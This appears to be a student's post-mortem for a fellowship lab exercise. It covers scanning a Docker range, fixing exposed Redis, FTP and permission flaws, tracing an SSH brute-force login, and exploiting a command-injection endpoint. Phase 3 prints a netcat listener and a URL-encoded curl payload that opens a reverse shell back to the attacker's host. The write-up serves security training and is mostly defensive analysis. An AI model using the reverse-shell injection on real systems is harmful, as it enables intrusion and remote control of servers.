# Phase 1 Final Reckoning — TEPP Post-Mortem
**Operator:** [Marcos Cruz]
**Date:** May 28, 2026
**Repository:** [https://github.com/thegiver86]
**TKH Innovation Fellowship 2026 | Phase 1 | Cybersecurity**

---

## Phase 0: Reconnaissance

### Triage Network — 172.100.0.0/24
[During the active reconnaissance of the Triage Network, I utilized an aggressive, all-port Nmap scan to identify three live hosts: 172.100.0.11, 172.100.0.12, and 172.100.0.13.On host 172.100.0.11, I discovered an exposed and completely unauthenticated Redis database operating on port 6379. Furthermore, host 172.100.0.12 was running an unauthorized File Transfer Protocol (FTP) service on port 21, representing a severe data exfiltration risk. Although host 172.100.0.13 did not broadcast any open network ports during the initial scan, subsequent internal enumeration revealed a critical file system misconfiguration where the /var/www/html directory possessed insecure global write and execute (777) permissions. ]

### Breach Network — 172.80.0.0/24
[My targeted reconnaissance of the Breach Network revealed a single active host residing at the IP address 172.80.0.10. An exhaustive port scan confirmed that the only exposed service on this machine was an OpenSSH daemon actively listening on port 22. This singular exposure indicated a restricted network perimeter devoid of easily exploitable web applications, which directly informed my methodology for Phase 2. Consequently, I deduced that the most viable ingress vector was a direct brute-force credential attack against the SSH service using a targeted dictionary list.]

### Exploitation Network — 172.60.0.0/24
[Reconnaissance of the Exploitation Network identified a single operational host at the IP address 172.60.0.10, which was actively exposing an HTTP web service on port 80. Subsequent investigation of this web endpoint revealed a custom Python-based application that accepted user input via a specific URL path parameter (/exec?cmd=). By analyzing the application's response behavior, I identified a critical Command Injection vulnerability, indicating that the backend code was passing unsanitized HTTP input directly into a system-level shell execution function. This lack of input validation provided a direct vector to bypass the application layer and achieve Remote Code Execution (RCE) on the underlying operating system.]

---

## Phase 1: Rapid Triage

### Server 1 — 172.100.0.11
**Vulnerability Identified:**
[An unauthenticated Redis data store was exposed to the public network, confirmed via an all-port Nmap scan revealing port 6379 was open.]

**Remediation Commands:**
`docker exec -it broken_server_1 sh`
`iptables -I INPUT -p tcp --dport 6379 -j DROP`

**Before State:**
[The Redis service was bound to 0.0.0.0, actively accepting unrestricted, unauthenticated connections from any external IP address.]

**After State:**
[The container’s host-based firewall drops all incoming TCP traffic destined for port 6379, isolating the database from the network.]

**Analysis:**
[Exposed Redis instances represent a severe operational threat, as they lack default authentication mechanisms. In a real enterprise environment, adversaries routinely exploit this to exfiltrate sensitive in-memory data, corrupt caches, or achieve remote code execution by writing malicious SSH keys directly into the server's root directory.]

### Server 2 — 172.100.0.12
**Vulnerability Identified:**
[A rogue vsftpd FTP service was operating on port 21, confirmed via initial Nmap reconnaissance.]

**Remediation Commands:**
`docker exec -it broken_server_2 sh`
`pkill vsftpd`

**Before State:**
[The vsftpd process was actively running as the primary container process, listening on port 21 for incoming, unencrypted file transfers.]

**After State:**
[The vsftpd process was terminated. Because it was the primary process (PID 1), the container safely exited, entirely removing the rogue asset from the network.]

**Analysis:**
[Unauthorized or "rogue" services bypass established security monitoring and compliance standards. FTP transmits data in plain text, meaning any credentials or files transferred over this protocol can be intercepted via packet sniffing, leading to immediate data breaches and compliance violations within an enterprise.]

### Server 3 — 172.100.0.13
**Vulnerability Identified:**
[The `/var/www/html` directory possessed inherently insecure 777 permissions (read, write, and execute access for all users), while the parent directory acted as a decoy.]

**Remediation Commands:**
`docker exec -it broken_server_3 sh`
`chmod 755 /var/www/html`

**Before State:**
[Permissions were `drwxrwxrwx` (777), allowing any standard user or service account to modify the contents.]

**After State:**
[Permissions were locked down to `drwxr-xr-x` (755), restricting write access exclusively to the root owner.]

**Analysis:**
[Granting global write and execute permissions to a web directory is a critical failure of the principle of least privilege. In an enterprise environment, this allows low-privileged attackers or compromised web applications to upload and execute malicious payloads, such as web shells, resulting in complete system compromise.]

---

## Phase 2: The Breach

**Cracked Credentials:**
- Username: [root]
- Password: [admin123]

**Forensic Evidence:**
- Exact Timestamp of Successful Login: [2026-05-29 17:31:58]
- Attacker IP Address: [172.80.0.1]

**Engineered iptables Rule:**
[`iptables -I INPUT -s 172.80.0.1 -j DROP`]

**SOC Analysis:**
[A single iptables block rule is insufficient as a standalone defensive measure because IP addresses are trivial for an adversary to spoof, rotate, or proxy. If an attacker simply shifts to a new VPN node or botnet IP, the static block rule is instantly rendered useless. A mature Security Operations Center (SOC) would deploy additional controls alongside this, such as implementing `fail2ban` for automated dynamic blocking, enforcing key-based SSH authentication while disabling password logins entirely, and placing the management interface behind a Zero Trust Network Access (ZTNA) gateway.]

---

## Phase 3: Full Spectrum

**Listener Configuration:**
[I used the Netcat utility to establish a persistent listener on my host bridge interface.
Command: `nc -lvnp 4444`]

**Reverse Shell Payload:**
[I utilized `curl` to deliver a URL-encoded Netcat reverse shell payload to the vulnerable endpoint.
Command: `curl "http://172.60.0.10/exec?cmd=nc%20172.60.0.1%204444%20-e%20%2Fbin%2Fbash"`]

**Command Injection Explanation:**
[Command injection occurs when an application passes unsafe, unsanitized user-supplied data directly to a system shell. In this instance, the Python web application utilized `subprocess.Popen` with the `shell=True` argument, which instructed the underlying Linux operating system to execute the exact string provided in the URL parameter, allowing an adversary to bypass the application logic and achieve Remote Code Execution (RCE)]

**Forensic Evidence:**
- Process ID (PID): [1]
- User-Agent: [curl/8.5.0]

**Lockdown Command:**
[`iptables -I INPUT -p tcp --dport 80 -j DROP`]

**Final Analytical Paragraph:**
[Executing this attack highlights the critical danger of trusting user input within application code. The ability to seamlessly pivot from a web request to a root-level operating system shell demonstrates why network-level defenses (like external firewalls) are insufficient when the application layer itself is inherently flawed. If a single defensive control had been implemented—specifically, strict input validation and sanitization (or disabling `shell=True` in the Python `subprocess` module)—this breach would have been entirely prevented. The application would have treated the malicious payload as a harmless string of text rather than an executable operating system command.]

---

## References
[APA format. Any tools, documentation, or resources referenced
during this operation.
Example: Hydra Project. (2024). THC-Hydra: A fast and flexible
online password cracking tool. https://github.com/vanhauser-thc/thc-hydra
Nmap (Phase 0 Reconnaissance):
Lyon, G. (n.d.). Nmap: The Network Mapper - Free Security Scanner. Retrieved May 29, 2026, from https://nmap.org/

iptables / Netfilter (Phase 1, 2, & 3 Remediation):
The Netfilter Project. (n.d.). The netfilter.org project. Retrieved May 29, 2026, from https://www.netfilter.org/

Docker (Range Infrastructure):
Docker Inc. (2026). Docker Documentation. Retrieved May 29, 2026, from https://docs.docker.com/

Netcat (Phase 3 Listener & Shell):
Kali Linux. (n.d.). netcat-traditional. Kali Tools. Retrieved May 29, 2026, from https://www.kali.org/tools/netcat/

cURL (Phase 3 Exploit Delivery):
Stenberg, D. (n.d.). curl. Retrieved May 29, 2026, from https://curl.se/
Redis Security (Phase 1 Target):
Redis Ltd. (n.d.). Redis Security. Retrieved May 29, 2026, from https://redis.io/docs/management/security/

Command Injection (Phase 3 Vulnerability):
OWASP Foundation. (n.d.). Command Injection. Retrieved May 29, 2026, from https://owasp.org/www-community/attacks/Command_Injection

File Permissions (Phase 1 Target):
Linux Foundation. (n.d.). File Permissions and Attributes. Linux.org. Retrieved May 29, 2026, from https://www.linux.org/]
